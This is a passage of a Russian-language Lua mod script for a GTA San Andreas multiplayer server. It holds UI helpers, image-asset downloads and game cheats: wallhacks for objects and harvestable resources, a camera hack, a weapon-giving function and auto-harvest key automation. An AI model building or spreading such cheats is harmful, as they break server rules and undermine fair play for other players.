	local success = ffi.C.GetKeyboardLayoutNameA(KeyboardLayoutName)
	local errorCode = ffi.C.GetLocaleInfoA(tonumber(ffi.string(KeyboardLayoutName), 16), 0x00000003, LocalInfo, BuffSize)
	local localName = ffi.string(LocalInfo)
	if capsState == 0 or capsState == -128 then
	    local toprint = ""
		lang = capitalize(localName:sub(1, 2):lower())
		if lang == "En" then
		    toprint = toprint.."{0099FF}"..lang
	elseif lang == "Ru" then
            toprint = toprint.."{BB0000}"..lang	
		end
        text = toprint
		end    
	wait(0)
	end 
end

function capitalize(str)
    return (str:gsub("^%l", string.upper))
end

function timekalashnik()
	while true do wait(50) 
    if timekalashnikov[0] then
         oXcurrenttime = 250
         oYcurrenttime = 430
	    local current_time = os.time() + piska
		local milliseconds = math.floor(os.clock() * 1000) % 1000
		 time_with_ms = os.date("%H:%M:%S", current_time) .. string.format(".%03d", milliseconds)
		sampTextdrawCreate(222, time_with_ms, oXcurrenttime + 32, oYcurrenttime)
		sampTextdrawSetLetterSizeAndColor(222, 0.3, 1.7, 0xFFe1e1e1)
		sampTextdrawSetOutlineColor(222, 0.5, 0xFFFF0000)
		sampTextdrawSetAlign(222, 1)
		sampTextdrawSetStyle(222, 2)
        end
        if timekalashnikov[0] == false then
            sampTextdrawDelete(222)
        end
	end
end

function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
	if string.match(text, "Текущее время") then
		chislo, mesyac, god = string.match(text, "Сегодняшняя дата: 	{2EA42E}(%d+):(%d+):(%d+)")
		chas, minuti, sekundi = string.match(text, "Текущее время: 	{345690}(%d+):(%d+):(%d+)")
		datetime = {year = god, month = mesyac, day = chislo, hour = chas, min = minuti, sec = sekundi}
		piska = tostring(os.time(datetime)) - os.time()
	end
end

function imgui.TextColoredRGBs(text)
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4
    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end
    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImVec4(r/255, g/255, b/255, a/255)
    end
    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else imgui.Text(u8(w)) end
        end
    end
    render_text(text)
end

function wh3dtext()
    while true do wait(200)
    local font = renderCreateFont("Arial", 10, 14)
    for id = 0, 2048 do
        local result = sampIs3dTextDefined(id)
        if result then
            text3d, color3d, posX3d, posY3d, posZ3d, distance3d, ignoreWalls3d, playerId3d, vehicleId3d = sampGet3dTextInfoById( id )
            if debugwh3d[0] then 
                local wposX, wposY = convert3DCoordsToScreen(posX3d,posY3d,posZ3d)
                local resX, resY = getScreenResolution()
                local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
                local dist = getDistanceBetweenCoords3d(playerX, playerY, playerZ, posX3d, posY3d, posZ3d)
                if dist <= 2 then
                    if wposX < resX and wposY < resY and isPointOnScreen (posX3d,posY3d,posZ3d,1) then
                        x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                        if isKeyDown(81) then
                            if lang == "Ru" then
                                x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                                setClipboardText(''..text3d..' '..color3d..' '..posX3d..' '..posY3d, posZ3d, distance3d, ignoreWalls3d, playerId3d, vehicleId3d)
                                if smspush[0] == 1 then
                                    sms('3D-Text Найден, сохранен в буфер')
                            elseif smspush[0] == 2 and toast_ok then  
                                    toast.Show(u8'3D-Text Найден, сохранен в буфер', toast.TYPE.DEBUG, 2)
                                end
                            end
                            if lang == "En" then
                                if smspush[0] == 1 then
                                    sms('Смените язык на русский')
                                elseif smspush[0] == 2 and toast_ok then  
                                        toast.Show(u8'Смените язык на русский', toast.TYPE.ERROR, 2)
                                    end
                                end
                            end
                        end                 
                    end    
                end
            end
        end
    end
end


function whobject()
    while true do wait(0)
    local font = renderCreateFont("Arial", 7, 4)
	    if debugwh[0] then
	        for _, v in pairs(getAllObjects()) do
		        local asd
		        if sampGetObjectSampIdByHandle(v) ~= -1 then
		            asd = sampGetObjectSampIdByHandle(v)
		        end
		        if isObjectOnScreen(v) then
		            local _, x, y, z = getObjectCoordinates(v)
		            local x1, y1 = convert3DCoordsToScreen(x,y,z)
		            local model = getObjectModel(v)
		            local x2,y2,z2 = getCharCoordinates(PLAYER_PED)
		            local x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
		            local distance = string.format("%.1f", getDistanceBetweenCoords3d(x, y, z, x2, y2, z2))
		            if debugwh[0] then
		                renderFontDrawText(font, (debugwh[0] and asd and "model = "..model.."; id = "..asd or "model = "..model).."; distance: "..distance, x1, y1, -1)	          
		            end
	            end
            end
		end
	end
end

function textdraws()
    local font = renderCreateFont("Arial", 8, 7) 
	while true do 
	wait(0) 
		if textdrawid[0] then 
			for a = 0, 2304	do 
				if sampTextdrawIsExists(a) then 
					x, y = sampTextdrawGetPos(a) 
					x1, y1 = convertGameScreenCoordsToWindowScreenCoords(x, y) 
					renderFontDrawText(font, a, x1, y1, 0xFFBEBEBE) 
				end
			end
		end
	end
end

function giveWeapon(id, ammo)
    local model = getWeapontypeModel(id)
    if model ~= 0 then
      if not hasModelLoaded(model) then
        requestModel(model)
        loadAllModelsNow()
        while not hasModelLoaded(model) do wait(0) end
      end
      giveWeaponToChar(playerPed, id, ammo)
      setCurrentCharWeapon(playerPed, id)
    end
  end

function powfishpov()
    original_fov = getCameraFov()
    changeable_fov = getCameraFov()
    while true do wait(0)
        cameraSetLerpFov(powfish[0], powfish[0], 1000, 1)
    end
end

local dhook, hook = pcall(require, 'lib.samp.events')
function photopng()
	if not doesDirectoryExist("moonloader\\config\\MiniCrHelper") then createDirectory('moonloader\\config\\MiniCrHelper') 
    end	
	downloadUrlToFile('https://i.imgur.com/THUtlo7.png', getWorkingDirectory() .. '/config/MiniCrHelper/123.png')
    if not doesDirectoryExist("moonloader\\config\\MiniCrHelper") then createDirectory('moonloader\\config\\MiniCrHelper') 
    end	
	downloadUrlToFile('https://i.imgur.com/SmdOLfa.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/456.png')

    downloadUrlToFile('https://i.imgur.com/KpMoTe5.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_406.jpg')
    downloadUrlToFile('https://i.imgur.com/sYNzNMW.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_411.jpg')
    downloadUrlToFile('https://i.imgur.com/vprODDF.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_432.jpg')
    downloadUrlToFile('https://i.imgur.com/3wpFv7q.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_510.jpg')
    downloadUrlToFile('https://i.imgur.com/oeEnf6T.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_520.jpg')
    downloadUrlToFile('https://i.imgur.com/vzyhdOa.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_522.jpg')
    downloadUrlToFile('https://i.imgur.com/ZUzgb6M.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_531.jpg')
    downloadUrlToFile('https://i.imgur.com/kDNK3L3.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_535.jpg')  

    downloadUrlToFile('https://i.imgur.com/1UA6ULX.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_539.jpg')  
    downloadUrlToFile('https://i.imgur.com/cHZDrBL.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_557.jpg')  
    downloadUrlToFile('https://i.imgur.com/gLK8zsb.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_560.jpg')  
    downloadUrlToFile('https://i.imgur.com/uIiMk3o.jpeg', getWorkingDirectory() .. '/config/MiniCrHelper/Vehicle_562.jpg')  

    downloadUrlToFile('https://i.imgur.com/fWTGIGc.png', getWorkingDirectory() .. '/config/MiniCrHelper/fWTGIGc.png')
    downloadUrlToFile('https://i.imgur.com/007E9C8.png', getWorkingDirectory() .. '/config/MiniCrHelper/007E9C8.png')
    downloadUrlToFile('https://i.imgur.com/rjVqOn6.png', getWorkingDirectory() .. '/config/MiniCrHelper/rjVqOn6.png')
    downloadUrlToFile('https://i.imgur.com/YiWnVeK.png', getWorkingDirectory() .. '/config/MiniCrHelper/YiWnVeK.png')
    downloadUrlToFile('https://i.imgur.com/DriLT3V.png', getWorkingDirectory() .. '/config/MiniCrHelper/DriLT3V.png')
    downloadUrlToFile('https://i.imgur.com/YN6v4ls.png', getWorkingDirectory() .. '/config/MiniCrHelper/YN6v4ls.png')
    downloadUrlToFile('https://i.imgur.com/YQXfptw.png', getWorkingDirectory() .. '/config/MiniCrHelper/YQXfptw.png')
    downloadUrlToFile('https://i.imgur.com/dvjD10U.png', getWorkingDirectory() .. '/config/MiniCrHelper/dvjD10U.png')
    downloadUrlToFile('https://i.imgur.com/b0eRmEa.png', getWorkingDirectory() .. '/config/MiniCrHelper/b0eRmEa.png')
    downloadUrlToFile('https://i.imgur.com/Rl2covI.png', getWorkingDirectory() .. '/config/MiniCrHelper/Rl2covI.png')
    downloadUrlToFile('https://i.imgur.com/6AsQKBc.png', getWorkingDirectory() .. '/config/MiniCrHelper/6AsQKBc.png')
    downloadUrlToFile('https://i.imgur.com/ijqIfT5.png', getWorkingDirectory() .. '/config/MiniCrHelper/ijqIfT5.png')
    downloadUrlToFile('https://i.imgur.com/HZgCRf9.png', getWorkingDirectory() .. '/config/MiniCrHelper/HZgCRf9.png')
    downloadUrlToFile('https://i.imgur.com/iQlpluJ.png', getWorkingDirectory() .. '/config/MiniCrHelper/iQlpluJ.png')
    downloadUrlToFile('https://i.imgur.com/4gnBHXU.png', getWorkingDirectory() .. '/config/MiniCrHelper/4gnBHXU.png')
    downloadUrlToFile('https://i.imgur.com/fw5kciy.png', getWorkingDirectory() .. '/config/MiniCrHelper/fw5kciy.png')
    downloadUrlToFile('https://i.imgur.com/wxOK47i.png', getWorkingDirectory() .. '/config/MiniCrHelper/wxOK47i.png')
    downloadUrlToFile('https://i.imgur.com/DAhTU6M.png', getWorkingDirectory() .. '/config/MiniCrHelper/DAhTU6M.png')
    downloadUrlToFile('https://i.imgur.com/Eq8hg4s.png', getWorkingDirectory() .. '/config/MiniCrHelper/Eq8hg4s.png')
    downloadUrlToFile('https://i.imgur.com/ekJsL6d.png', getWorkingDirectory() .. '/config/MiniCrHelper/ekJsL6d.png')
    downloadUrlToFile('https://i.imgur.com/O7y1m1R.png', getWorkingDirectory() .. '/config/MiniCrHelper/O7y1m1R.png')
    downloadUrlToFile('https://i.imgur.com/D5v9GIT.png', getWorkingDirectory() .. '/config/MiniCrHelper/D5v9GIT.png')
    downloadUrlToFile('https://i.imgur.com/zYE1HCI.png', getWorkingDirectory() .. '/config/MiniCrHelper/zYE1HCI.png')
    downloadUrlToFile('https://i.imgur.com/iPQF756.png', getWorkingDirectory() .. '/config/MiniCrHelper/iPQF756.png')
    downloadUrlToFile('https://i.imgur.com/Jt32eXt.png', getWorkingDirectory() .. '/config/MiniCrHelper/Jt32eXt.png')
    downloadUrlToFile('https://i.imgur.com/kJhYmLd.png', getWorkingDirectory() .. '/config/MiniCrHelper/kJhYmLd.png')

    downloadUrlToFile('https://i.imgur.com/IktbiW5.png', getWorkingDirectory() .. '/config/MiniCrHelper/IktbiW5.png')
    downloadUrlToFile('https://i.imgur.com/Rsef1Oa.png', getWorkingDirectory() .. '/config/MiniCrHelper/Rsef1Oa.png')
    downloadUrlToFile('https://i.imgur.com/LOpJCzO.png', getWorkingDirectory() .. '/config/MiniCrHelper/LOpJCzO.png')
    downloadUrlToFile('https://i.imgur.com/N7nLPZG.png', getWorkingDirectory() .. '/config/MiniCrHelper/N7nLPZG.png')
    downloadUrlToFile('https://i.imgur.com/MUdyYZS.png', getWorkingDirectory() .. '/config/MiniCrHelper/MUdyYZS.png')
    downloadUrlToFile('https://i.imgur.com/W4wfwoJ.png', getWorkingDirectory() .. '/config/MiniCrHelper/W4wfwoJ.png')
    downloadUrlToFile('https://i.imgur.com/J4j20Mg.png', getWorkingDirectory() .. '/config/MiniCrHelper/J4j20Mg.png')
    downloadUrlToFile('https://i.imgur.com/PGvfdHF.png', getWorkingDirectory() .. '/config/MiniCrHelper/PGvfdHF.png')
    downloadUrlToFile('https://i.imgur.com/hF0rn6M.png', getWorkingDirectory() .. '/config/MiniCrHelper/hF0rn6M.png')
    downloadUrlToFile('https://i.imgur.com/SLWRVUO.png', getWorkingDirectory() .. '/config/MiniCrHelper/SLWRVUO.png')

    downloadUrlToFile('https://i.imgur.com/0MbFCG6.png', getWorkingDirectory() .. '/config/MiniCrHelper/0MbFCG6.png')
    downloadUrlToFile('https://i.imgur.com/trMUD3P.png', getWorkingDirectory() .. '/config/MiniCrHelper/trMUD3P.png')
    downloadUrlToFile('https://i.imgur.com/UFlxEc8.png', getWorkingDirectory() .. '/config/MiniCrHelper/UFlxEc8.png')
    downloadUrlToFile('https://i.imgur.com/rO1z5Gq.png', getWorkingDirectory() .. '/config/MiniCrHelper/rO1z5Gq.png')

    downloadUrlToFile('https://i.imgur.com/6hIGyoY.png', getGameDirectory() .. '/mouse.png')
end

function camhack()
    flymode = 0  
	speed = 1.0
	radarHud = 0
	time = 0
	keyPressed = 0
	while true do wait(0)
		time = time + 1
		if isKeyDown(VK_X) and isKeyDown(VK_1) then
			if flymode == 0 then
				displayRadar(false)
				displayHud(false)	    
				posX, posY, posZ = getCharCoordinates(playerPed)
				angZ = getCharHeading(playerPed)
				angZ = angZ * -1.0
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
				angY = 0.0
				lockPlayerControl(true)
				flymode = 1
			end
		end
		if flymode == 1 and not sampIsChatInputActive() and not isSampfuncsConsoleActive() then
			offMouX, offMouY = getPcMouseMovement()    
			offMouX = offMouX / 4.0
			offMouY = offMouY / 4.0
			angZ = angZ + offMouX
			angY = angY + offMouY
			if angZ > 360.0 then angZ = angZ - 360.0 end
			if angZ < 0.0 then angZ = angZ + 360.0 end
			if angY > 89.0 then angY = 89.0 end
			if angY < -89.0 then angY = -89.0 end   
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0        
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2)
			curZ = angZ + 180.0
			curY = angY * -1.0      
			radZ = math.rad(curZ) 
			radY = math.rad(curY)                   
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 10.0     
			cosZ = cosZ * 10.0       
			sinY = sinY * 10.0                       
			posPlX = posX + sinZ 
			posPlY = posY + cosZ 
			posPlZ = posZ + sinY              
			angPlZ = angZ * -1.0
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0        
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2)
			if isKeyDown(VK_W) then      
				radZ = math.rad(angZ) 
				radY = math.rad(angY)                   
				sinZ = math.sin(radZ)
				cosZ = math.cos(radZ)      
				sinY = math.sin(radY)
				cosY = math.cos(radY)       
				sinZ = sinZ * cosY      
				cosZ = cosZ * cosY 
				sinZ = sinZ * speed      
				cosZ = cosZ * speed       
				sinY = sinY * speed  
				posX = posX + sinZ 
				posY = posY + cosZ 
				posZ = posZ + sinY      
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)      
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0         
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2)
			if isKeyDown(VK_S) then  
				curZ = angZ + 180.0
				curY = angY * -1.0      
				radZ = math.rad(curZ) 
				radY = math.rad(curY)                   
				sinZ = math.sin(radZ)
				cosZ = math.cos(radZ)      
				sinY = math.sin(radY)
				cosY = math.cos(radY)       
				sinZ = sinZ * cosY      
				cosZ = cosZ * cosY 
				sinZ = sinZ * speed      
				cosZ = cosZ * speed       
				sinY = sinY * speed                       
				posX = posX + sinZ 
				posY = posY + cosZ 
				posZ = posZ + sinY      
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0        
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2)	  
			if isKeyDown(VK_A) then  
				curZ = angZ - 90.0
				radZ = math.rad(curZ)
				radY = math.rad(angY)
				sinZ = math.sin(radZ)
				cosZ = math.cos(radZ)
				sinZ = sinZ * speed
				cosZ = cosZ * speed
				posX = posX + sinZ
				posY = posY + cosZ
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0        
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY
			pointCameraAtPoint(poiX, poiY, poiZ, 2)       
			if isKeyDown(VK_D) then  
				curZ = angZ + 90.0
				radZ = math.rad(curZ)
				radY = math.rad(angY)
				sinZ = math.sin(radZ)
				cosZ = math.cos(radZ)       
				sinZ = sinZ * speed
				cosZ = cosZ * speed
				posX = posX + sinZ
				posY = posY + cosZ      
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0        
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2)   
			if isKeyDown(VK_SPACE) then  
				posZ = posZ + speed
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0       
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2) 
			if isKeyDown(VK_SHIFT) then  
				posZ = posZ - speed
				setFixedCameraPosition(posX, posY, posZ, 0.0, 0.0, 0.0)
			end 
			radZ = math.rad(angZ) 
			radY = math.rad(angY)             
			sinZ = math.sin(radZ)
			cosZ = math.cos(radZ)      
			sinY = math.sin(radY)
			cosY = math.cos(radY)       
			sinZ = sinZ * cosY      
			cosZ = cosZ * cosY 
			sinZ = sinZ * 1.0      
			cosZ = cosZ * 1.0     
			sinY = sinY * 1.0       
			poiX = posX
			poiY = posY
			poiZ = posZ      
			poiX = poiX + sinZ 
			poiY = poiY + cosZ 
			poiZ = poiZ + sinY      
			pointCameraAtPoint(poiX, poiY, poiZ, 2) 
			if keyPressed == 0 and isKeyDown(VK_F10) then
				keyPressed = 1
				if radarHud == 0 then
					displayRadar(true)
					displayHud(true)
					radarHud = 1
				else
					displayRadar(false)
					displayHud(false)
					radarHud = 0
				end
			end
			if wasKeyReleased(VK_F10) and keyPressed == 1 then keyPressed = 0 end
			if isKeyDown(187) then 
				speed = speed + 0.01
				printStringNow(speed, 1000)
			end 	               
			if isKeyDown(189) then 
				speed = speed - 0.01 
				if speed < 0.01 then speed = 0.01 end
				printStringNow(speed, 1000)
			end   
			if isKeyDown(VK_X) and isKeyDown(VK_2) then
				displayRadar(true)
				displayHud(true)
				radarHud = 0	    
				angPlZ = angZ * -1.0
				lockPlayerControl(false)
				restoreCameraJumpcut()
				setCameraBehindPlayer()
				flymode = 0     
			end
		end
	end
end

function get_timer(time)
    return string.format("%s:%s:%s",string.format("%s%s",((tonumber(os.date("%H",time)) < tonumber(os.date("%H",0)) and (24 + tonumber(os.date("%H",time))) - tonumber(os.date("%H",0)) or tonumber(os.date("%H",time)) - (tonumber(os.date("%H",0)))) < 10 and 0 or ""),(tonumber(os.date("%H",time)) < tonumber(os.date("%H",0)) and (24 + tonumber(os.date("%H",time))) - tonumber(os.date("%H",0)) or tonumber(os.date("%H",time)) - (tonumber(os.date("%H",0))))),os.date("%M",time),os.date("%S",time))
end

function showfps()
    while true do wait(400)
    if sampGetGamestate() == 3 then sessiononline = os.time() - sessionStart end
        fps = Memory.getfloat(0xB7CB50, 0, false)
        fpsID = string.format('%.f', fps)
        _, PINGUPDATE = sampGetPlayerIdByCharHandle(PLAYER_PED)
        ping = sampGetPlayerPing(PINGUPDATE)
        idshow = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
    end
end

function posxy()
    while true do wait(0)
    if renderlavok then
        local mouseX, mouseY = getCursorPos()
        mainIni.main.renderlavokx, mainIni.main.renderlavoky = mouseX, mouseY
        if isKeyDown(32) then
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            renderlavok = false
            if smspush[0] == 1 then
                sms("Позиция сохранена")
        elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'Позиция сохранена', toast.TYPE.INFO, 2)
            end
        end
    end
    if chestpos then
        local chestposX, chestposY = getCursorPos()
        mainIni.main.chestposx, mainIni.main.chestposy = chestposX, chestposY
        if isKeyDown(32) then
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            chestpos = false
            if smspush[0] == 1 then
                sms("Позиция сохранена")
        elseif smspush[0] == 2 and toast_ok then  
                toast.Show(u8'Позиция сохранена', toast.TYPE.INFO, 2)
            end
        end
    end
    if delayedtimerpos then
        local delayedtimerpossX, delayedtimerpossY = getCursorPos()
        mainIni.main.delayedtimerposx, mainIni.main.delayedtimerposy = delayedtimerpossX, delayedtimerpossY
        if isKeyDown(32) then
            inicfg.save(mainIni, "MiniCrHelper/MiniHelper-CR")
            delayedtimerpos = false
            if smspush[0] == 1 then
                sms("Позиция сохранена")
            elseif smspush[0] == 2 and toast_ok then  
                    toast.Show(u8'Позиция сохранена', toast.TYPE.INFO, 2)
                end
            end
        end
    end
end

local fontlenandxlopak = renderCreateFont("arial", 10, 12)
function lenandxlopak()
    while true do wait(0)
    if lenwh[0] then
        for id = 0, 2048 do
            local result = sampIs3dTextDefined( id )
            if result then
                local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById( id )
                if text:match('Лён%((%d+) из (%d+)%)') then
                    n1,n2=text:match('Лён%((%d+) из (%d+)%)') 
                    local wposX, wposY = convert3DCoordsToScreen(posX,posY,posZ)
                    local resX, resY = getScreenResolution()
                    if wposX < resX and wposY < resY and isPointOnScreen (posX,posY,posZ,1) then
                        x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                        x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                        renderFontDrawText(fontlenandxlopak, "Лён("..n1..' из '..n2..')', wposX, wposY, 0xFF00FF00)			
                    end
                end
                if text:match('Лён в процессе роста (.+)') then
                    t1=text:match('Лён в процессе роста (.+)')
                    local wposX, wposY = convert3DCoordsToScreen(posX,posY,posZ)
                    local resX, resY = getScreenResolution()
                    if wposX < resX and wposY < resY and isPointOnScreen (posX,posY,posZ,1)  then
                        x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                        x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                        renderFontDrawText(fontlenandxlopak, ""..t1, wposX, wposY,-1)
                    end				
                end
            end
        end
    end
    for id = 0, 2048 do
        local result = sampIs3dTextDefined( id )
        if result then
            local text, color, posX, posY, posZ, distance, ignoreWalls, playerId, vehicleId = sampGet3dTextInfoById( id )
            if xlopokwh[0] then
                if text:match('Хлопок%((%d+) из (%d+)%)') then
                    n1,n2=text:match('Хлопок%((%d+) из (%d+)%)') 
                    local wposX, wposY = convert3DCoordsToScreen(posX,posY,posZ)
                    local resX, resY = getScreenResolution()
                        if wposX < resX and wposY < resY and isPointOnScreen (posX,posY,posZ,1) then
                            x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                            x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                            renderFontDrawText(fontlenandxlopak, "Хлопок("..n1..' из '..n2..')', wposX, wposY, 0xFF00FF00)
                        end
                    end
                    if text:match('Хлопок в процессе роста (.+)') then
                        t1=text:match('Хлопок в процессе роста (.+)')
                        local wposX, wposY = convert3DCoordsToScreen(posX,posY,posZ)
                        local resX, resY = getScreenResolution()
                        if wposX < resX and wposY < resY and isPointOnScreen (posX,posY,posZ,1)  then
                            x2,y2,z2 = getCharCoordinates(PLAYER_PED)
                            x10, y10 = convert3DCoordsToScreen(x2,y2,z2)
                            renderFontDrawText(fontlenandxlopak, ""..t1, wposX, wposY,-1)
                        end				
                    end              
                end
            end
        end
    end
end

function Search3Dtext(x, y, z, radius, patern)
    local text = ""
    local color = 0
    local posX = 0.0
    local posY = 0.0
    local posZ = 0.0
    local distance = 0.0
    local ignoreWalls = false
    local player = -1
    local vehicle = -1
    local result = false
    for id = 0, 2048 do
        if sampIs3dTextDefined(id) then
            local text2, color2, posX2, posY2, posZ2, distance2, ignoreWalls2, player2, vehicle2 = sampGet3dTextInfoById(id)
            if getDistanceBetweenCoords3d(x, y, z, posX2, posY2, posZ2) < radius then
                if string.len(patern) ~= 0 then
                    if string.match(text2, patern, 0) ~= nil then result = true end
                else
                    result = true
                end
                if result then
                    text = text2
                    color = color2
                    posX = posX2
                    posY = posY2
                    posZ = posZ2
                    distance = distance2
                    ignoreWalls = ignoreWalls2
                    player = player2
                    vehicle = vehicle2
                    radius = getDistanceBetweenCoords3d(x, y, z, posX, posY, posZ)
                end
            end
        end
    end
    return result, text, color, posX, posY, posZ, distance, ignoreWalls, player, vehicle
end

function autoalts()
    while true do wait(450)
		if autoalt[0] then
			local x, y, z = getCharCoordinates(PLAYER_PED)
			local result, _, _, _, _, _, _, _, _, _ = Search3Dtext(x, y, z, 3, "{73B461}Можно собрать")
			if result then
				setGameKeyState(21, 255)
				wait(5)
				setGameKeyState(21, 0)
				result = false
			end
            local result1, _1, _1, _1, _1, _1, _1, _1, _1, _1 = Search3Dtext(x, y, z, 3, "{73B461}Для добычи ископаемого")
            if result1 then
				setGameKeyState(21, 255)
				wait(5)
				setGameKeyState(21, 0)
				result1 = false
			end
        end
    end
end

local fontshaxta = renderCreateFont("impact", 12, 12)
function shaxtas()
    while true do wait(0)
        if shaxta[0] then
            for id = 0, 2048 do
                local result = sampIs3dTextDefined( id )
                if result then
